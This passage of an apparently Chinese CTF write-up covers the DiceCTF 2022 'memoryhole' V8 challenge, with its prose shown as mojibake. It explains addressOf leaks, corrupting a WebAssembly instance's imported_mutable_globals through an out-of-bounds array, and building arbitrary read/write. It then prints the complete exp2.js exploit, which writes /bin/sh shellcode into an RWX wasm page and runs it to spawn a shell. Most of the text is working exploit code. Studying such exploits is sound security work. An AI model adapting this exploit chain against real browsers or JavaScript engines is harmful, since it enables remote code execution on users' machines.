<p>æ¥ç€æ˜¯é€šè¿‡å¯¹è±¡æ¥å®ç° addressOfã€‚è¿™é‡Œå€ŸåŠ©äº†ä¸€ä¸ªå“¨å…µå€¼ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> leak = &#123;<span class="attr">guard</span>: <span class="number">0x2333</span>, <span class="attr">obj</span>: fake_mutable_globals&#125;;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">find_leak_offset</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i ++) &#123;</span><br><span class="line">        <span class="title function_">d22u</span>(vuln_arr[i]);</span><br><span class="line">        <span class="keyword">var</span> low = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">var</span> high = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (low == <span class="number">0x4666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> high;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (high == <span class="number">0x4666</span>) &#123;</span><br><span class="line">            fake_mutable_globals_elements_arr_idx = i - <span class="number">4</span>;</span><br><span class="line">            <span class="title function_">d22u</span>(vuln_arr[i+<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">return</span> __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    leak[<span class="string">&#x27;obj&#x27;</span>] = obj;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">find_leak_offset</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ç±»ä¼¼ä½¿ç”¨ä¸€äº›æ ‡è®°æˆ–å“¨å…µå€¼æ¥å¯»æ‰¾åœ°å€çš„æ–¹å¼æ¯”è¾ƒé€šç”¨ï¼Œå“ªæ€•å†™åˆ°ä¸€åŠå‘ç°éœ€è¦æ·»åŠ ä¸€äº›å¯¹è±¡æ”¹å˜äº†å†…å­˜å¸ƒå±€ä¹Ÿä¸éœ€è¦å†æ¬¡è°ƒè¯•æ¥ä¸€ä¸ªä¸€ä¸ªæ‰¾è¦ç”¨çš„åç§»</p>
</blockquote>
<p>é¦–å…ˆæ³„éœ² <strong>å‡†å¤‡è¦ç”¨ä½œ <code>imported_mutable_globals</code> çš„ fake æ•°ç»„çš„åœ°å€ï¼Œç„¶åæ‹¿åˆ°å…¶çœŸæ­£çš„ elements åœ°å€ï¼Œ</strong>ç„¶åæ³„éœ² wasmInstance çš„åœ°å€ï¼Œè®¡ç®—ä¸€ä¸‹åç§»å°±å¯ä»¥å¾—åˆ° <code>imported_mutable_globals</code> å­—æ®µåœ¨ wasmInstance ä¸­çš„ä½ç½®ã€‚ç„¶åé€šè¿‡ oob æ•°ç»„çš„è¶Šç•Œå†™ï¼Œç›´æ¥è¦†å†™ <code>imported_mutable_globals</code> ä¸º fake æ•°ç»„çš„ elements åœ°å€ã€‚æ³„éœ²åœ°å€ä¸ç¯¡æ”¹ <code>imported_mutable_globals</code> ï¼š</p>
<p><img src="/img/Dicectf2022-memoryhole/2-11.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/2-7.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/2-8.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/2-9.png"></p>
<p>ä½†æ˜¯  <code>imported_mutable_globals</code> çš„åœ°å€ä¸ oob æ•°ç»„ elements çš„åç§»å¹¶ä¸æ€»æ˜¯ 8 çš„å€æ•°ï¼Œå°±ä¼šå‡ºç°å¦‚ä¸‹çš„æƒ…å†µï¼š</p>
<p><img src="/img/Dicectf2022-memoryhole/2-10.png"></p>
<p>æ‰€ä»¥é’ˆå¯¹è¿™ç§æƒ…å†µè¿˜éœ€è¦å¤„ç†ï¼Œåœ¨å‰ä¸€ä¸ªå­—æ®µçš„é«˜ä½å†™ç›®æ ‡åœ°å€çš„ä½å­—èŠ‚ï¼Œåä¸€ä¸ªå­—æ®µçš„ä½ä½å†™ç›®æ ‡åœ°å€çš„é«˜å­—èŠ‚ï¼Œè¿™æ ·æ‹¼èµ·æ¥ä¸­é—´çš„   <code>imported_mutable_globals</code> å°±åˆæ³•äº†ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!split)</span><br><span class="line">    vuln_arr[imported_mutable_globals_index] = <span class="title function_">u2d</span>(target_addr);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[!] split!!!&quot;</span>);</span><br><span class="line">    <span class="title function_">d22u</span>(vuln_arr[imported_mutable_globals_index + <span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">var</span> pad1 = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">var</span> high = js_base / <span class="number">0x100000000</span> <span class="comment">// + (pad1 * 0x100000000);</span></span><br><span class="line">    vuln_arr[imported_mutable_globals_index] = <span class="title function_">u2d</span>(arr_in_fake_mutable_globals_addr * <span class="number">0x100000000</span>);</span><br><span class="line">    vuln_arr[imported_mutable_globals_index + <span class="number">1</span>] = <span class="title function_">u2d</span>(high);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶ <code>imported_mutable_globals</code> çš„å€¼å·²ç»ä¸º fake æ•°ç»„çš„ elements çš„åœ°å€ï¼Œé‚£ä¹ˆarbRead å’Œ arbWrite çš„å®ç°å°±æ˜¯å¯¹è¯¥æ•°ç»„çš„ç¬¬ä¸€ä¸ªå­—æ®µèµ‹å€¼ä¸ºè¦è¯»å†™çš„åœ°å€ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_mutable_globals[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">getGlobal</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite</span>(<span class="params">addr, val</span>) &#123;</span><br><span class="line">    fake_mutable_globals[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="title function_">setGlobal</span>(<span class="title class_">BigInt</span>(val));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†å†™ä¸€ä¸ª wasmInstance_attackï¼Œå³å¹³æ—¶å¸¸ç”¨çš„ï¼Œåœ¨ wasmInstance_attack + 0x60 å¤„å­˜æ”¾äº† rwx é¡µï¼Œæ³„éœ²è¯¥åœ°å€å‡†å¤‡ä¸€ä¼šå‘å…¶ä¸­å†™å…¥ shellcodeã€‚</p>
<p>åˆ©ç”¨ arbWrite() å†™ shellcode åˆ° rwx é¡µï¼š</p>
<p><img src="/img/Dicectf2022-memoryhole/shellcode.png"></p>
<p>æœ€ç»ˆè°ƒç”¨ f() æ‹¿åˆ°shellï¼š</p>
<p><img src="/img/Dicectf2022-memoryhole/res.png"></p>
<h2 id="exp2-js"><a href="#exp2-js" class="headerlink" title="exp2.js"></a>exp2.js</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> __buf8 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">const</span> __dvCvt = <span class="keyword">new</span> <span class="title class_">DataView</span>(__buf8);</span><br><span class="line"><span class="keyword">const</span> __bigInt = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(__buf8);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Uint64 =&gt; double</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> tmp0 = val &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="keyword">var</span> tmp1 = (val - tmp0) / <span class="number">0x100000000</span>;</span><br><span class="line">    __dvCvt.<span class="title function_">setUint32</span>(<span class="number">0</span>, tmp0, <span class="literal">true</span>);</span><br><span class="line">    __dvCvt.<span class="title function_">setUint32</span>(<span class="number">4</span>, tmp1, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> __dvCvt.<span class="title function_">getFloat64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d22u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    __dvCvt.<span class="title function_">setFloat64</span>(<span class="number">0</span>, val, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">b2u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    __bigInt[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>) + __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>) * <span class="number">0x100000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">hex</span> = (<span class="params">x</span>) =&gt; (<span class="string">&quot;0x&quot;</span> + x.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">js_heap_defragment</span>(<span class="params"></span>) &#123; <span class="comment">// used for stable fake JSValue crafting</span></span><br><span class="line">    <span class="title function_">gc</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++) <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// js_heap_defragment();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_mutable_globals_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> fake_mutable_globals_elements_arr_idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> vuln_arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Uint32Array</span>_len_idx = -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Uint32Array</span>_len = <span class="number">0xc</span>;</span><br><span class="line"><span class="keyword">var</span> leak_arr = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="title class_">Uint32Array</span>_len);</span><br><span class="line"><span class="keyword">var</span> fake_mutable_globals = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> leak = &#123;<span class="attr">guard</span>: <span class="number">0x2333</span>, <span class="attr">obj</span>: fake_mutable_globals&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="variable language_">global</span> = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Global</span>(&#123;<span class="attr">value</span>:<span class="string">&#x27;i64&#x27;</span>, <span class="attr">mutable</span>:<span class="literal">true</span>&#125;, <span class="number">256n</span>);</span><br><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">126</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">1</span>, <span class="number">126</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">106</span>, <span class="number">115</span>, <span class="number">6</span>, <span class="number">103</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">3</span>, <span class="number">126</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">71</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">99</span>, <span class="number">71</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">71</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">1</span>, <span class="number">124</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode),&#123; <span class="attr">js</span>: &#123;<span class="variable language_">global</span>&#125; &#125;);</span><br><span class="line"><span class="keyword">var</span> getGlobal = wasmInstance.<span class="property">exports</span>.<span class="property">getGlobal</span>;</span><br><span class="line"><span class="keyword">var</span> setGlobal = wasmInstance.<span class="property">exports</span>.<span class="property">setGlobal</span>;</span><br><span class="line"></span><br><span class="line">vuln_arr.<span class="title function_">setLength</span>(<span class="number">0x100000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">d22u</span>(vuln_arr[i]);</span><br><span class="line">    <span class="keyword">const</span> high = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">const</span> low = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (high == <span class="title class_">Uint32Array</span>_len || low == <span class="title class_">Uint32Array</span>_len) &#123;</span><br><span class="line">        <span class="title class_">Uint32Array</span>_len_idx = i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Uint32Array_len_idx =&gt; &quot;</span> + <span class="title function_">hex</span>(<span class="title class_">Uint32Array</span>_len_idx));</span><br><span class="line"><span class="comment">// base pointer in high word</span></span><br><span class="line"><span class="keyword">var</span> base_pointer_idx = <span class="title class_">Uint32Array</span>_len_idx + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> byte_length_idx = <span class="title class_">Uint32Array</span>_len_idx - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">d22u</span>(vuln_arr[<span class="title class_">Uint32Array</span>_len_idx]);</span><br><span class="line"><span class="keyword">const</span> pad = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">vuln_arr[base_pointer_idx] = <span class="title function_">u2d</span>(<span class="number">0x100000000</span>);</span><br><span class="line">vuln_arr[byte_length_idx] = <span class="title function_">u2d</span>(<span class="number">0x1000</span>);</span><br><span class="line">vuln_arr[<span class="title class_">Uint32Array</span>_len_idx] = <span class="title function_">u2d</span>((<span class="number">0x1000</span> / <span class="number">4</span>) * <span class="number">0x100000000</span> + pad);</span><br><span class="line"><span class="keyword">var</span> js_base = leak_arr[<span class="number">5</span>] * <span class="number">0x100000000</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] js_base =&gt; &quot;</span> + <span class="title function_">hex</span>(js_base));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">find_leak_offset</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i ++) &#123;</span><br><span class="line">        <span class="title function_">d22u</span>(vuln_arr[i]);</span><br><span class="line">        <span class="keyword">var</span> low = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">var</span> high = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (low == <span class="number">0x4666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> high;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (high == <span class="number">0x4666</span>) &#123;</span><br><span class="line">            fake_mutable_globals_elements_arr_idx = i - <span class="number">4</span>;</span><br><span class="line">            <span class="title function_">d22u</span>(vuln_arr[i+<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">return</span> __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    leak[<span class="string">&#x27;obj&#x27;</span>] = obj;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">find_leak_offset</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fake_mutable_globals_offset = <span class="title function_">addressOf</span>(fake_mutable_globals)</span><br><span class="line"><span class="keyword">if</span> (fake_mutable_globals_offset &amp;&amp; fake_mutable_globals_elements_arr_idx) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] fake_mutable_globals_offset =&gt; &quot;</span> + <span class="title function_">hex</span>(fake_mutable_globals_offset));</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] fake_mutable_globals_elements_arr_idx =&gt; &quot;</span> + <span class="title function_">hex</span>(fake_mutable_globals_elements_arr_idx));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// !!!</span></span><br><span class="line"><span class="keyword">var</span> arr_in_fake_mutable_globals_addr = fake_mutable_globals_offset - <span class="number">9</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] arr_in_fake_mutable_globals_addr =&gt; &quot;</span> + <span class="title function_">hex</span>(arr_in_fake_mutable_globals_addr));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> vuln_addr = <span class="title function_">addressOf</span>(vuln_arr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] vuln_addr =&gt; &quot;</span> + <span class="title function_">hex</span>(vuln_addr));</span><br><span class="line"><span class="keyword">var</span> vuln_elements_addr = vuln_addr - <span class="number">1</span> - <span class="number">0x18</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] vuln_elements_addr =&gt; &quot;</span> + <span class="title function_">hex</span>(vuln_elements_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmInstanceAddr = <span class="title function_">addressOf</span>(wasmInstance);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] wasmInstanceAddr =&gt; &quot;</span> + <span class="title function_">hex</span>(wasmInstanceAddr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> imported_mutable_globals_addr = wasmInstanceAddr - <span class="number">1</span> + <span class="number">0x50</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] imported_mutable_globals_addr =&gt; &quot;</span> + <span class="title function_">hex</span>(imported_mutable_globals_addr));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> split = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// modify imported_mutable_globals =&gt; arr_in_fake_mutable_globals_addr</span></span><br><span class="line"><span class="keyword">var</span> imported_mutable_globals_index = (imported_mutable_globals_addr - vuln_elements_addr) / <span class="number">8</span>;</span><br><span class="line"><span class="keyword">if</span> (imported_mutable_globals_index % <span class="number">1</span> == <span class="number">0.5</span>) &#123;</span><br><span class="line">    imported_mutable_globals_index = imported_mutable_globals_index - <span class="number">0.5</span>;</span><br><span class="line">    split = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] imported_mutable_globals_index =&gt; &quot;</span> + imported_mutable_globals_index);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr_in_fake_mutable_globals_index = (arr_in_fake_mutable_globals_addr - vuln_elements_addr) / <span class="number">8</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] arr_in_fake_mutable_globals_index =&gt; &quot;</span> + arr_in_fake_mutable_globals_index);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> target_addr = js_base + arr_in_fake_mutable_globals_addr;</span><br><span class="line"><span class="keyword">if</span> (!split)</span><br><span class="line">    vuln_arr[imported_mutable_globals_index] = <span class="title function_">u2d</span>(target_addr);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[!] split!!!&quot;</span>);</span><br><span class="line">    <span class="title function_">d22u</span>(vuln_arr[imported_mutable_globals_index + <span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">var</span> pad1 = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">var</span> high = js_base / <span class="number">0x100000000</span> <span class="comment">// + (pad1 * 0x100000000);</span></span><br><span class="line">    vuln_arr[imported_mutable_globals_index] = <span class="title function_">u2d</span>(arr_in_fake_mutable_globals_addr * <span class="number">0x100000000</span>);</span><br><span class="line">    vuln_arr[imported_mutable_globals_index + <span class="number">1</span>] = <span class="title function_">u2d</span>(high);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_mutable_globals[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">getGlobal</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite</span>(<span class="params">addr, val</span>) &#123;</span><br><span class="line">    fake_mutable_globals[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="title function_">setGlobal</span>(<span class="title class_">BigInt</span>(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode1 = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line">    <span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>,</span><br><span class="line">    <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>,</span><br><span class="line">    <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>,</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">var</span> wasm2 = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode1);</span><br><span class="line"><span class="keyword">var</span> wasmInstance_attack = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm2);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance_attack.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmInstance_attack_addr = <span class="title function_">addressOf</span>(wasmInstance_attack);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] wasmInstance_attack_addr =&gt; &quot;</span> + <span class="title function_">hex</span>(wasmInstance_attack_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rwx_offset = wasmInstance_attack_addr + <span class="number">0x60</span> - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_addr = <span class="title function_">arbRead</span>(rwx_offset + js_base);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] rwx_addr =&gt; &quot;</span> + <span class="title function_">hex</span>(rwx_addr));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="number">0xb848686a</span>, <span class="number">0x6e69622f</span>, <span class="number">0x7361622f</span>, <span class="number">0xe7894850</span>, <span class="number">0xb848686a</span>, <span class="number">0x6e69622f</span>, <span class="number">0x7361622f</span>, <span class="number">0x56f63150</span>, <span class="number">0x485e086a</span>, <span class="number">0x4856e601</span>, <span class="number">0xd231e689</span>, <span class="number">0xf583b6a</span>, <span class="number">0x90909005</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbWrite</span>(<span class="title function_">b2u</span>(rwx_addr) + i * <span class="number">4</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// %DebugPrint(vuln_arr);</span></span><br><span class="line"><span class="comment">// %DebugPrint(wasmInstance);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>

<p>æ–‡ä¸­å¦‚æœ‰é”™è¯¯å’Œç–‘é—®ï¼Œè¿˜æœ›åŠæ—¶äº¤æµæ¢è®¨ã€‚</p>
